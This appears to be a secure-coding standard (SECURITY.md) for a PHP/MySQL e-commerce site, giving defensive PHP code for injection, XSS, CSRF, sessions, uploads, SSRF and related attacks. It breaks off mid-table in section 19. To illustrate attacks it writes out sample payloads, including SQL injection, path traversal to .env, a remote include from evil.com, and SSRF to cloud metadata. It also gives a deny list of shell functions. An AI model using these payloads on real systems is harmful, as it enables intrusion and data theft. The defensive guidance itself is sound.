# SECURITY.md — Secure, Fast & SEO-Friendly PHP Development Standard for Better Integrity

**Project:** Embroidery E-Commerce & Management System (Core PHP 8.3+, MySQL 8, Tailwind, Vanilla JS)
**Audience:** Every developer who writes or reviews code for this project
**Status:** Mandatory standard — applies to storefront, customer account area, admin portal, APIs, cron jobs and servers

---

## 0. An Honest Note About "Unhackable"

No website on earth is 100% unhackable. Anyone who promises that is wrong. What we can do is:

1. **Remove every known, common vulnerability class** (the ones responsible for almost all real-world breaches).
2. **Layer defenses** so that when one fails, another stops the attacker (defense in depth).
3. **Limit the damage** if something is breached (least privilege, encryption, backups).
4. **Detect and respond fast** (logging, alerts, incident plan).
5. **Keep it fast and SEO-friendly**, because security that slows the site or breaks crawling is a business cost.

**Goal of this document:** make the platform as hard to attack as practical, and make sure that security, speed and SEO work together instead of against each other.

---

## Table of Contents

1. Security Principles
2. Threat Model for This Project
3. Secure Project Setup (folders, config, secrets)
4. PHP Runtime Hardening (`php.ini`)
5. Database Layer — SQL Injection and DB Hardening
6. Output Handling — Cross-Site Scripting (XSS)
7. Cross-Site Request Forgery (CSRF)
8. Sessions and Cookies
9. Authentication, Passwords and 2FA
10. Brute Force, Credential Stuffing and Rate Limiting
11. Authorization — RBAC, IDOR, Privilege Escalation
12. File Uploads
13. File System Attacks — Path Traversal, LFI, RFI
14. Command Injection and Dangerous Functions
15. Insecure Deserialization and Object Injection
16. SSRF, Open Redirects and Outbound Requests
17. Header Injection, Email Injection and Host Header Attacks
18. XXE and XML/JSON Handling
19. Mass Assignment and Input Validation
20. Business Logic Attacks (E-Commerce Specific)
21. Payment and Webhook Security
22. API Security
23. Clickjacking, CORS and Security Headers
24. Bots, Scraping, Spam and DDoS
25. Secrets, Encryption and Data Protection
26. Dependencies and Supply Chain
27. Server, Web Server and Network Hardening
28. Database Server Hardening
29. Logging, Monitoring and Alerting
30. Backups and Disaster Recovery
31. Performance Practices That Also Improve Security
32. SEO-Friendly Security
33. Secure Development Workflow
34. Security Testing
35. Incident Response Plan
36. Pre-Launch Security Checklist
37. Attack → Defense Quick Reference
38. Helper Code Library (copy-ready)

---

## 1. Security Principles

| Principle | Meaning in this project |
|-----------|-------------------------|
| **Never trust input** | Everything from the browser (forms, query strings, cookies, headers, uploads, JSON, hidden fields) is hostile until validated |
| **Validate early, escape late** | Validate on input; escape for the specific output context (HTML, attribute, JS, URL, SQL, shell) |
| **Server is the authority** | Prices, discounts, shipping, stock, permissions are decided on the server only |
| **Least privilege** | DB users, file permissions, admin roles and API tokens get only what they need |
| **Defense in depth** | Multiple independent layers: CDN/WAF → web server → PHP code → database → monitoring |
| **Secure by default** | Deny first, allow explicitly; fail closed on errors |
| **Minimize attack surface** | Remove unused code, endpoints, extensions, ports, packages |
| **Keep secrets secret** | No secrets in code, Git, logs, client-side JS or the web root |
| **Log everything important** | You cannot defend what you cannot see |
| **Simple beats clever** | Use well-tested built-in functions; never invent your own crypto |

---

## 2. Threat Model for This Project

### 2.1 What we protect

- Customer personal data (name, phone, address, email, order history)
- Admin accounts and business data (sales, costs, suppliers)
- Payment integrity (orders, payment status, refunds)
- Product, price and stock integrity
- Website availability and reputation (defacement, malware, SEO spam)
- Search ranking (hacked-site spam injection destroys SEO)

### 2.2 Who attacks

| Attacker | Typical goal |
|----------|--------------|
| Automated bots/scanners | Find old software, SQLi, XSS, exposed files (`.env`, `.git`, backups) |
| Credential stuffers | Log in with leaked passwords |
| Scrapers / competitors | Copy catalog and prices, hammer search |
| Fraudsters | Fake orders, coupon abuse, price tampering, card testing |
| Malicious customers | Access other customers' orders (IDOR) |
| Malicious/compromised staff | Abuse admin permissions |
| SEO spammers | Inject hidden links/pharma/casino pages |
| DDoS actors | Take the site offline |

### 2.3 OWASP Top 10 Mapping

| OWASP Category | Where covered |
|----------------|---------------|
| A01 Broken Access Control | §11, §20, §22 |
| A02 Cryptographic Failures | §9, §25 |
| A03 Injection (SQL, command, XSS) | §5, §6, §14, §17 |
| A04 Insecure Design | §2, §20 |
| A05 Security Misconfiguration | §4, §23, §27, §28 |
| A06 Vulnerable Components | §26 |
| A07 Identification & Authentication Failures | §8, §9, §10 |
| A08 Software & Data Integrity Failures | §15, §21, §26 |
| A09 Logging & Monitoring Failures | §29 |
| A10 SSRF | §16 |

---

## 3. Secure Project Setup

### 3.1 Only `public/` is web-accessible

```
/var/www/embroidery-store/
├── public/          ← ONLY this is the web root (DocumentRoot / root)
├── admin/ account/ modules/ includes/ api/ cron/
├── config/          ← outside web root
├── storage/         ← outside web root (logs, cache, private files, invoices)
├── vendor/          ← outside web root
├── database/        ← outside web root (schema/migrations)
└── .env             ← outside web root, never committed
```

Rules:

- Entry points (`index.php`) in `public/` `require` the rest from parent folders.
- Never put `.env`, `.git`, `composer.json`, `*.sql`, `*.bak`, `*.zip`, `phpinfo.php` or test files anywhere inside `public/`.
- Uploaded public images go to `public/uploads/` **with PHP execution disabled** (see §12, §27).
- Private files (invoices, payment receipts, exports) go in `storage/private/` and are served through an authenticated PHP download script.

### 3.2 Configuration and secrets

Use environment variables or a `.env` file outside the web root.

```php
<?php
// config/app.php
declare(strict_types=1);

return [
    'env'      => getenv('APP_ENV') ?: 'production',
    'debug'    => false,                         // NEVER true in production
    'url'      => getenv('APP_URL'),
    'timezone' => 'Asia/Karachi',
    'app_key'  => getenv('APP_KEY'),             // 32+ random bytes, base64
    'db' => [
        'host' => getenv('DB_HOST'),
        'name' => getenv('DB_NAME'),
        'user' => getenv('DB_USER'),
        'pass' => getenv('DB_PASS'),
    ],
];
```

- Add `.env` to `.gitignore`.
- Use different secrets for local, staging and production.
- Rotate secrets after any suspected exposure or staff change.

### 3.3 Bootstrap file (every request)

```php
<?php
// includes/bootstrap.php
declare(strict_types=1);

error_reporting(E_ALL);
ini_set('display_errors', '0');          // never show errors to visitors
ini_set('log_errors', '1');
ini_set('error_log', __DIR__ . '/../storage/logs/php-error.log');

date_default_timezone_set('UTC');        // store UTC, display in Asia/Karachi

set_exception_handler(function (Throwable $e) {
    error_log($e::class . ': ' . $e->getMessage() . ' @ ' . $e->getFile() . ':' . $e->getLine());
    http_response_code(500);
    require __DIR__ . '/../templates/errors/500.php'; // generic page, no details
    exit;
});

require __DIR__ . '/security.php';   // headers, session, csrf
require __DIR__ . '/database.php';
```

---

## 4. PHP Runtime Hardening (`php.ini`)

```ini
; --- Information leakage ---
expose_php = Off
display_errors = Off
display_startup_errors = Off
log_errors = On
html_errors = Off

; --- Dangerous features ---
allow_url_fopen = Off
allow_url_include = Off
enable_dl = Off
register_argc_argv = Off
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,show_source,highlight_file,phpinfo,dl,eval
; NOTE: "eval" is a language construct and cannot be disabled here; ban it in code review.
; If a feature truly needs one of these (e.g., Imagick CLI), enable it only in an isolated worker.

; --- Uploads ---
file_uploads = On
upload_max_filesize = 8M
post_max_size = 10M
max_file_uploads = 20

; --- Resource limits (DoS protection) ---
max_execution_time = 30
max_input_time = 30
max_input_vars = 1000
memory_limit = 256M

; --- Filesystem confinement ---
open_basedir = /var/www/embroidery-store:/tmp

; --- Sessions ---
session.use_strict_mode = 1
session.use_only_cookies = 1
session.use_trans_sid = 0
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = "Lax"
session.sid_length = 48
session.sid_bits_per_character = 6
session.gc_maxlifetime = 7200
session.name = "__Host-ESID"          ; __Host- prefix requires Secure + Path=/ + no Domain

; --- Performance (also reduces attack surface from slow requests) ---
opcache.enable = 1
opcache.validate_timestamps = 0       ; production: reset opcache on deploy
opcache.memory_consumption = 192
opcache.interned_strings_buffer = 16
opcache.max_accelerated_files = 20000
opcache.jit = tracing
opcache.jit_buffer_size = 64M
```

Also:

- Run **PHP-FPM with a dedicated low-privilege user** per site/pool.
- Disable unused extensions.
- Keep PHP on a **supported version** (8.3+). Unsupported versions get no security patches.

---

## 5. Database Layer — SQL Injection and DB Hardening

### 5.1 The attack

An attacker sends input like `' OR 1=1 --` to change the SQL your code runs, reading or deleting data, bypassing login, or taking over the server.

### 5.2 The defense: PDO with real prepared statements — always

```php
<?php
// includes/database.php
declare(strict_types=1);

function db(): PDO {
    static $pdo = null;
    if ($pdo === null) {
        $cfg = require __DIR__ . '/../config/app.php';
        $dsn = "mysql:host={$cfg['db']['host']};dbname={$cfg['db']['name']};charset=utf8mb4";
        $pdo = new PDO($dsn, $cfg['db']['user'], $cfg['db']['pass'], [
            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES   => false,   // real prepared statements
            PDO::ATTR_STRINGIFY_FETCHES  => false,
        ]);
    }
    return $pdo;
}
```

**Safe:**

```php
$stmt = db()->prepare('SELECT id, name, price FROM products WHERE slug = :slug AND status = :status');
$stmt->execute([':slug' => $slug, ':status' => 'active']);
$product = $stmt->fetch();
```

**NEVER:**

```php
// ❌ vulnerable
$pdo->query("SELECT * FROM products WHERE slug = '$slug'");
```

### 5.3 Things prepared statements do NOT protect

| Case | Safe approach |
|------|---------------|
| Dynamic `ORDER BY` / column names | **Whitelist** values |
| Dynamic table names | Whitelist |
| `LIMIT` / `OFFSET` | Cast to `int` and clamp |
| `IN (...)` lists | Generate placeholders programmatically |
| `LIKE` search | Bind the value; escape `%` and `_` if needed |

```php
// ORDER BY whitelist
$allowedSort = ['newest' => 'created_at DESC', 'price_asc' => 'price ASC', 'price_desc' => 'price DESC'];
$orderBy = $allowedSort[$_GET['sort'] ?? ''] ?? $allowedSort['newest'];

$page   = max(1, (int)($_GET['page'] ?? 1));
$limit  = 24;
$offset = ($page - 1) * $limit;

$sql = "SELECT id, name, price FROM products WHERE status='active' ORDER BY $orderBy LIMIT :limit OFFSET :offset";
$stmt = db()->prepare($sql);
$stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
$stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
$stmt->execute();
```

```php
// IN list
$ids = array_map('intval', $ids);
$in  = implode(',', array_fill(0, count($ids), '?'));
$stmt = db()->prepare("SELECT * FROM products WHERE id IN ($in)");
$stmt->execute($ids);
```

```php
// LIKE search with escaping wildcards
$q = str_replace(['\\', '%', '_'], ['\\\\', '\\%', '\\_'], $q);
$stmt = db()->prepare("SELECT id, name FROM products WHERE name LIKE :q ESCAPE '\\\\' LIMIT 20");
$stmt->execute([':q' => "%$q%"]);
```

### 5.4 Other database rules

- **Second-order injection:** data already stored in the DB is not "trusted" — still use prepared statements when reusing it.
- Never concatenate user data into SQL, even for "internal" admin tools.
- Use **transactions** for checkout, payment and stock changes.
- Store money as `DECIMAL(12,2)`.
- Use a **separate DB user per purpose** (see §28): the web app user cannot `DROP`, `ALTER`, `GRANT` or `FILE`.
- Do not show SQL errors to users; log them privately.
- Prevent race conditions with `SELECT ... FOR UPDATE` on stock rows.

---

## 6. Output Handling — Cross-Site Scripting (XSS)

### 6.1 The attack

Attacker injects JavaScript (`<script>…</script>`, `onerror=`, `javascript:` URLs) into reviews, names, addresses, search boxes, or admin fields. It runs in other users' browsers to steal sessions, perform actions, or deface pages. **Stored XSS in admin panels is especially dangerous** (customer name in order list executes in an admin's browser).

### 6.2 Defense: escape for the right context, every time

```php
<?php
// includes/helpers.php
function e(?string $v): string {                       // HTML body & quoted attributes
    return htmlspecialchars($v ?? '', ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, 'UTF-8');
}

function js(mixed $v): string {                        // inside <script> as data
    return json_encode($v, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_THROW_ON_ERROR);
}

function url_param(string $v): string {                // inside URL query
    return rawurlencode($v);
}
```

| Context | Method |
|---------|--------|
| HTML text / attribute (always quote attributes) | `e($value)` |
| JavaScript data | `js($value)` via `json_encode` with `JSON_HEX_*` |
| URL query component | `rawurlencode()` |
| URL as `href`/`src` | Validate scheme (`http`, `https`, `mailto`, `tel` only) then `e()` |
| CSS | Avoid dynamic CSS from users; whitelist values |
| Rich text (descriptions, CMS pages) | Sanitize with **HTMLPurifier** allow-list |

```php
<!-- ✅ -->
<h1><?= e($product['name']) ?></h1>
<input type="text" name="q" value="<?= e($q) ?>">
<script>const CART = <?= js($cartData) ?>;</script>

<!-- ❌ -->
<h1><?= $product['name'] ?></h1>
<a href="<?= $_GET['next'] ?>">
```

### 6.3 Extra XSS rules

- Never use `innerHTML` with user data in JavaScript. Use `textContent`, or build nodes with `createElement`.
- Do not put user data inside inline event handlers (`onclick="…"`).
- Rich text from admins/customers must pass through an allow-list sanitizer **on save and be treated as untrusted on render**.
- Add a **Content Security Policy** (see §23) — it blocks most XSS impact even if a bug slips in.
- Set cookies `HttpOnly` so scripts cannot read session cookies.
- Validate URL schemes to block `javascript:` and `data:` links.

```php
function safe_url(string $url): string {
    $p = parse_url($url);
    if ($p === false) return '#';
    $scheme = strtolower($p['scheme'] ?? '');
    if ($scheme !== '' && !in_array($scheme, ['http', 'https', 'mailto', 'tel'], true)) return '#';
    return $url;
}
```

---

## 7. Cross-Site Request Forgery (CSRF)

### 7.1 The attack

A malicious site makes a logged-in user's browser submit a request (change email, place an order, change order status in admin) without their knowledge.

### 7.2 Defense layers

1. **CSRF token** on every state-changing request (POST/PUT/PATCH/DELETE).
2. `SameSite=Lax` (or `Strict` for admin) cookies.
3. **Never change state on GET.**
4. Verify `Origin`/`Referer` headers for sensitive actions.
5. Require re-authentication for critical actions (change password/email, refunds).

```php
<?php
// includes/csrf.php
function csrf_token(): string {
    if (empty($_SESSION['csrf'])) {
        $_SESSION['csrf'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf'];
}

function csrf_field(): string {
    return '<input type="hidden" name="_csrf" value="' . e(csrf_token()) . '">';
}

function csrf_verify(): void {
    $sent = $_POST['_csrf'] ?? ($_SERVER['HTTP_X_CSRF_TOKEN'] ?? '');
    if (!is_string($sent) || !hash_equals($_SESSION['csrf'] ?? '', $sent)) {
        http_response_code(419);
        exit('Invalid request.');
    }
    // Origin check
    $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
    if ($origin !== '') {
        $host = parse_url($origin, PHP_URL_HOST);
        if (!hash_equals($_SERVER['HTTP_HOST'] ?? '', $host ?? '')) {
            http_response_code(403);
            exit('Bad origin.');
        }
    }
}
```

For `fetch()`:

```js
fetch('/api/cart/add', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': document.querySelector('meta[name=csrf]').content },
  body: JSON.stringify({ variant_id: 12, qty: 1 }),
  credentials: 'same-origin'
});
```

Rotate the token after login. Webhooks from payment gateways are exempt from CSRF tokens but **must** verify signatures (§21).

---

## 8. Sessions and Cookies

### 8.1 Attacks

Session fixation, session hijacking (stolen cookie), session prediction, leftover sessions after logout.

### 8.2 Secure session start

```php
<?php
// includes/security.php (session part)
if (session_status() === PHP_SESSION_NONE) {
    session_name('__Host-ESID');
    session_set_cookie_params([
        'lifetime' => 0,
        'path'     => '/',
        'secure'   => true,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
    session_start();
}
```

### 8.3 Rules

| Rule | Implementation |
|------|----------------|
| Regenerate ID on login/privilege change | `session_regenerate_id(true);` |
| Idle timeout | Customers 2 h, admin 30 min of inactivity |
| Absolute timeout | Admin 8–12 h |
| Full logout | Clear `$_SESSION`, expire cookie, `session_destroy()` |
| Bind loosely to client | Store hashed User-Agent; optional IP-range check for admin |
| Store sessions in Redis | Faster, easily invalidated, supports multi-server |
| Separate admin and customer sessions | Different session names/cookies/paths |
| Invalidate all sessions on password change | Track a per-user `session_version` |
| Don't store sensitive data in sessions | Store IDs, not card data/passwords |

```php
function login_user(int $userId): void {
    session_regenerate_id(true);
    $_SESSION['uid']  = $userId;
    $_SESSION['ua']   = hash('sha256', $_SERVER['HTTP_USER_AGENT'] ?? '');
    $_SESSION['last'] = time();
    $_SESSION['csrf'] = bin2hex(random_bytes(32));
}

function enforce_session(int $idleSeconds = 1800): void {
    if (isset($_SESSION['uid'])) {
        $uaOk = hash_equals($_SESSION['ua'] ?? '', hash('sha256', $_SERVER['HTTP_USER_AGENT'] ?? ''));
        if (!$uaOk || (time() - ($_SESSION['last'] ?? 0)) > $idleSeconds) {
            logout_user();
            return;
        }
        $_SESSION['last'] = time();
    }
}

function logout_user(): void {
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $p['path'], $p['domain'], $p['secure'], $p['httponly']);
    }
    session_destroy();
}
```

### 8.4 Other cookies

- Use `Secure; HttpOnly; SameSite` for everything non-JS.
- "Remember me" tokens: random 32-byte value; store only a **hash** in the DB; rotate on each use; revoke on logout/password change.
- Never put user IDs, roles, prices or cart totals in client-editable cookies without a signature.

---

## 9. Authentication, Passwords and 2FA

### 9.1 Password storage

```php
$hash = password_hash($password, PASSWORD_ARGON2ID);   // or PASSWORD_BCRYPT with cost 12
if (password_verify($input, $hash)) {
    if (password_needs_rehash($hash, PASSWORD_ARGON2ID)) {
        // re-hash and update DB after successful login
    }
}
```

- Never MD5/SHA1/SHA256 for passwords. Never reversible encryption.
- Do not truncate or restrict password characters; allow long passphrases (up to 128 chars).
- Minimum 10–12 characters; check against common/breached passwords (e.g., a local list or HIBP k-anonymity API).
- Do not force frequent rotations; force reset only on compromise.

### 9.2 Login flow safeguards

- Generic error: "Invalid email or password" (no user enumeration).
- Same response time for existing and non-existing accounts (always run `password_verify` against a dummy hash if the user isn't found).
- Rate limiting and lockouts (§10).
- Notify users of new-device logins and password changes by email.
- Log all login successes and failures.

### 9.3 Password reset

- Generate token with `random_bytes(32)`; email the raw token; **store only `hash('sha256', $token)`**.
- Expiry 30–60 minutes, single use, invalidated when a new one is requested.
- Same response whether the email exists or not ("If an account exists, we've sent an email").
- After reset: invalidate all sessions and notify the user.

```php
$token  = bin2hex(random_bytes(32));
$hash   = hash('sha256', $token);
// store $hash + expires_at; email link: /reset?token=$token
// verify: hash_equals($row['token_hash'], hash('sha256', $_GET['token']))
```

### 9.4 Email verification

Signed or random single-use tokens with expiry; no account-sensitive features until verified (or at least for password-reset-by-email trust).

### 9.5 Admin hardening

- **2FA (TOTP)** for all admin users (mandatory for Super Admin and Accountant).
- Strong password policy; no shared accounts.
- Optional IP allow-list or VPN/Cloudflare Access for `/admin`.
- Change the admin URL path from default guesses *in addition to* — never *instead of* — real authentication.
- Re-authenticate (password/2FA) before: changing roles, refunds, exporting customer data, changing payment settings.

---

## 10. Brute Force, Credential Stuffing and Rate Limiting

### 10.1 Controls

| Target | Limit (example) |
|--------|-----------------|
| Customer login | 5 failures / 15 min per account **and** per IP |
| Admin login | 3–5 failures → 15–30 min lockout, alert owner |
| Password reset requests | 3 / hour per email and per IP |
| Registration | 5 / hour per IP |
| Coupon attempts | 10 / hour per IP/session |
| Search / API | e.g., 60 requests / minute per IP |
| Contact / review forms | 3 / 10 min + honeypot + CAPTCHA |
| Checkout submission | 5 / 10 min per session/IP (card-testing defense) |

### 10.2 Redis-based limiter

```php
function rate_limit(string $key, int $max, int $windowSec): bool {
    $r = redis();                          // wrapper around Redis connection
    $k = 'rl:' . hash('sha256', $key);
    $count = $r->incr($k);
    if ($count === 1) $r->expire($k, $windowSec);
    return $count <= $max;
}

if (!rate_limit('login:' . $_SERVER['REMOTE_ADDR'], 10, 900)) {
    http_response_code(429);
    header('Retry-After: 900');
    exit('Too many attempts. Try again later.');
}
```

Behind Cloudflare, use the real client IP (`CF-Connecting-IP`) **only if the request truly comes from Cloudflare's IP ranges** — otherwise attackers can spoof it.

### 10.3 Additional measures

- Invisible CAPTCHA (e.g., Cloudflare Turnstile / hCaptcha) on login, registration, reset, contact and checkout after suspicious behaviour.
- Honeypot hidden field + minimum time-to-submit check.
- Progressive delays; do not permanently lock customers (attackers can lock out victims) — use temporary lockouts and email notifications.
- Block known bad IPs/ASNs via Cloudflare WAF.

---

## 11. Authorization — RBAC, IDOR, Privilege Escalation

### 11.1 The attacks

- **IDOR:** changing `?order_id=1001` to `1002` to read someone else's order.
- **Privilege escalation:** a Product Manager calling an Accountant-only endpoint directly.
- **Forced browsing:** requesting `/admin/reports/export.php` without permission.

### 11.2 Defenses

1. **Authenticate, then authorize, on every request** — including AJAX and API endpoints. Hiding a button is not security.
2. Central permission function; deny by default.
3. **Always scope queries by owner**.

```php
// includes/permissions.php
function require_permission(string $perm): void {
    $user = current_admin();
    if (!$user || !user_can($user['id'], $perm)) {
        http_response_code(403);
        exit('Forbidden');
    }
}

// usage in admin/orders/update-status.php
require_permission('orders.update_status');
csrf_verify();
```

```php
// ✅ Customer can only see own orders
$stmt = db()->prepare('SELECT * FROM orders WHERE id = :id AND customer_id = :cid');
$stmt->execute([':id' => $orderId, ':cid' => $_SESSION['uid']]);
$order = $stmt->fetch() ?: abort(404);   // 404, not 403, to avoid confirming existence
```

4. Use **non-guessable public identifiers** for guest order tracking (random tokens), not sequential IDs.
5. Check permissions for **related objects** too (address belongs to the user, the variant belongs to the product, etc.).
6. Never accept `role`, `is_admin`, `user_id` or `price` from request data.
7. Log denied attempts and alert on repeated ones.
8. Re-check permissions inside background jobs and exports.

### 11.4 Permission naming

`products.view`, `products.edit`, `products.delete`, `orders.view`, `orders.update_status`, `orders.refund`, `customers.view`, `customers.export`, `reports.view`, `settings.edit`, `users.manage`.

---

## 12. File Uploads

### 12.1 The attacks

Uploading a PHP web shell (`shell.php`, `shell.php.jpg`, `shell.phtml`), SVG/HTML with scripts, huge files (DoS), polyglot files, path traversal in filenames, ImageTragick-style image-parser exploits, zip bombs.

### 12.2 Defenses

| Control | Detail |
|---------|--------|
| Allow-list extensions **and** MIME | Images: jpg, png, webp. Receipts: jpg, png, pdf. Never allow php, phtml, phar, htaccess, svg (unless sanitized), html |
| Check real content | `finfo_file()` for MIME; `getimagesize()` for images |
| **Re-encode images** | Load with GD/Imagick and save as a new file — destroys embedded payloads and EXIF/GPS |
| Random server filenames | `bin2hex(random_bytes(16)) . '.webp'` — never trust the client filename |
| Size limits | Enforce in PHP and web server; limit image dimensions (e.g., ≤ 6000 px) |
| Store outside web root when private | Receipts/invoices in `storage/private/`, served via authenticated script |
| Disable script execution in upload dir | Web server config (§27) |
| Serve with safe headers | `X-Content-Type-Options: nosniff` and correct `Content-Type` |
| Virus scan (optional) | ClamAV for receipts/documents |
| Limit upload count & rate | Prevent storage exhaustion |

```php
function save_image_upload(array $file, string $destDir): string {
    if ($file['error'] !== UPLOAD_ERR_OK || !is_uploaded_file($file['tmp_name'])) {
        throw new RuntimeException('Upload failed.');
    }
    if ($file['size'] > 8 * 1024 * 1024) {
        throw new RuntimeException('File too large.');
    }

    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mime  = $finfo->file($file['tmp_name']);
    $allowed = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'image/webp' => 'webp'];
    if (!isset($allowed[$mime])) {
        throw new RuntimeException('Invalid image type.');
    }

    $info = getimagesize($file['tmp_name']);
    if ($info === false || $info[0] > 6000 || $info[1] > 6000) {
        throw new RuntimeException('Invalid image dimensions.');
    }

    // Re-encode (strips payloads/EXIF) and convert to WebP
    $src = match ($mime) {
        'image/jpeg' => imagecreatefromjpeg($file['tmp_name']),
        'image/png'  => imagecreatefrompng($file['tmp_name']),
        'image/webp' => imagecreatefromwebp($file['tmp_name']),
    };
    if (!$src) throw new RuntimeException('Cannot process image.');

    $name = bin2hex(random_bytes(16)) . '.webp';
    $path = rtrim($destDir, '/') . '/' . $name;
    imagewebp($src, $path, 82);
    imagedestroy($src);
    chmod($path, 0644);
    return $name;
}
```

Private file download:

```php
// account/download-receipt.php
$stmt = db()->prepare('SELECT file_path FROM payment_receipts WHERE id=:id AND customer_id=:cid');
// ... verify ownership ...
header('Content-Type: application/pdf');
header('X-Content-Type-Options: nosniff');
header('Content-Disposition: attachment; filename="receipt.pdf"');
readfile(STORAGE_PATH . '/private/' . basename($row['file_path']));
```

---

## 13. File System Attacks — Path Traversal, LFI, RFI

### 13.1 The attacks

- **Path traversal:** `?file=../../config/.env`
- **LFI (Local File Inclusion):** `include $_GET['page'] . '.php';`
- **RFI (Remote File Inclusion):** `include 'http://evil.com/shell.txt';`

### 13.2 Defenses

- **Never** pass user input to `include`, `require`, `file_get_contents`, `readfile`, `fopen`, `unlink`, etc.
- Use **allow-lists/maps**:

```php
$pages = ['about' => 'about.php', 'faq' => 'faq.php', 'contact' => 'contact.php'];
$page = $pages[$_GET['p'] ?? ''] ?? null;
if (!$page) { http_response_code(404); exit; }
require __DIR__ . '/pages/' . $page;
```

- If a filename is unavoidable, use `basename()` and verify with `realpath()`:

```php
$base = realpath(STORAGE_PATH . '/private');
$full = realpath($base . '/' . basename($name));
if ($full === false || !str_starts_with($full, $base . DIRECTORY_SEPARATOR)) {
    abort(404);
}
```

- `allow_url_include = Off`, `allow_url_fopen = Off`, `open_basedir` set (§4).
- Strip null bytes; reject `..`, `%2e%2e`, absolute paths.

---

## 14. Command Injection and Dangerous Functions

### 14.1 The attack

User input reaches `exec()`, `system()`, `shell_exec()`, backticks, `proc_open()`, `mail()` parameters, `unserialize()`, or `eval()` — giving the attacker server control.

### 14.2 Defenses

- **Do not use shell commands in web requests.** Use PHP libraries (GD/Imagick, Dompdf, PhpSpreadsheet) instead.
- Ban `eval()`, `assert()` with strings, `create_function`, `preg_replace` with `/e`, `extract($_POST)`, `$$variable` from input, `parse_str()` without result array.
- If a command is unavoidable (isolated worker only): use `escapeshellarg()` for each argument, a fixed command, and an argument allow-list.

```php
// last resort, in a worker, never in web request
$cmd = 'convert ' . escapeshellarg($inputPath) . ' -resize 800x ' . escapeshellarg($outPath);
```

- Static analysis (PHPStan/Psalm + security rules) in CI to flag dangerous calls.

---

## 15. Insecure Deserialization and Object Injection

### 15.1 The attack

`unserialize($_COOKIE['cart'])` lets attackers craft objects that trigger "gadget chains" in libraries to execute code or delete files.

### 15.2 Defenses

- **Never `unserialize()` untrusted data.** Use `json_decode()` with validation.
- If you must, `unserialize($data, ['allowed_classes' => false])`.
- Sign any data stored client-side (HMAC) and verify before use.
- Avoid PHAR file operations on user-controlled paths (`phar://` triggers deserialization).

```php
function sign(string $data): string {
    $key = base64_decode(app_key());
    return $data . '.' . hash_hmac('sha256', $data, $key);
}
function verify_signed(string $signed): ?string {
    [$data, $sig] = explode('.', $signed, 2) + [null, null];
    if (!$data || !$sig) return null;
    $key = base64_decode(app_key());
    return hash_equals(hash_hmac('sha256', $data, $key), $sig) ? $data : null;
}
```

---

## 16. SSRF, Open Redirects and Outbound Requests

### 16.1 SSRF

If the server fetches a user-supplied URL (e.g., "import image from URL"), an attacker can make it hit internal services (`http://169.254.169.254/` cloud metadata, `http://127.0.0.1:6379` Redis).

**Defenses**

- Avoid fetching user-supplied URLs. If necessary: allow-list domains, resolve DNS and **block private/loopback/link-local ranges**, only `https`, disable redirects (or re-validate each hop), set short timeouts and size limits.
- Firewall the app servers so they cannot reach internal admin interfaces or cloud metadata unnecessarily.

```php
function is_public_ip(string $ip): bool {
    return filter_var($ip, FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false;
}
```

### 16.2 Open redirects

`/login?next=https://evil.com` is used for phishing.

```php
function safe_redirect(string $target, string $fallback = '/'): never {
    // allow only same-site relative paths
    if (!preg_match('#^/(?!/)[^\\\\]*$#', $target)) {
        $target = $fallback;
    }
    header('Location: ' . $target, true, 302);
    exit;
}
```

---

## 17. Header Injection, Email Injection and Host Header Attacks

### 17.1 HTTP response splitting / header injection

Never put raw user input into `header()`. Strip `\r` and `\n`. (Modern PHP rejects multiple headers, but keep validating.)

### 17.2 Email header injection

Attackers put `\r\nBcc: victim@…` in "name" or "subject" fields to turn your contact form into a spam relay.

- Use **PHPMailer** (handles encoding) and validate:

```php
function clean_header_value(string $v): string {
    return trim(preg_replace('/[\r\n]+/', ' ', $v));
}
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) { /* reject */ }
```

- Set `From` to your own domain; use user's email as `Reply-To` only after validation.
- Rate-limit and CAPTCHA the contact form.
- Configure SPF, DKIM and DMARC for your domain (security + deliverability).

### 17.3 Host header attacks

Attackers send a fake `Host:` header to poison password-reset links or cache.

- **Never build absolute URLs from `$_SERVER['HTTP_HOST']`.** Use `APP_URL` from config.
- Configure the web server to accept only your domain(s) (default catch-all server block returns 444/404).

---

## 18. XXE and XML/JSON Handling

- Avoid XML where possible. If parsing XML: `libxml_set_external_entity_loader(null)` / use `LIBXML_NONET`, never `LIBXML_NOENT`, never `LIBXML_DTDLOAD`.
- Excel/DOCX (PhpSpreadsheet) imports: keep the library updated; limit upload size; run imports in background workers; validate every cell value.
- JSON: use `json_decode($raw, true, 512, JSON_THROW_ON_ERROR)`, check structure and types, limit body size (e.g., 1 MB).
- SVG: do not accept user-uploaded SVGs (they can contain scripts).

---

## 19. Mass Assignment and Input Validation

### 19.1 Mass assignment

Never do `UPDATE users SET ... ` from `$_POST` generically. An attacker adds `role=admin` or `price=1`.

```php
// ✅ Explicit allow-list
$allowed = ['name', 'phone', 'address_line1', 'city'];
$data = array_intersect_key($_POST, array_flip($allowed));
```

### 19.2 Validation standards

Validate **type, length, range, format and business meaning** on the server (client-side validation is only UX).

```php
function validate_int(mixed $v, int $min, int $max): int {
    $i = filter_var($v, FILTER_VALIDATE_INT, ['options' => ['min_range' => $min, 'max_range' => $max]]);
    if ($i === false) throw new InvalidArgumentException('Invalid number.');
    return $i;
}
```

| Field | Rule |
|-------|------|
| Email | `FILTER_VALIDATE_EMAIL`, max 254 chars, normalized lowercase |
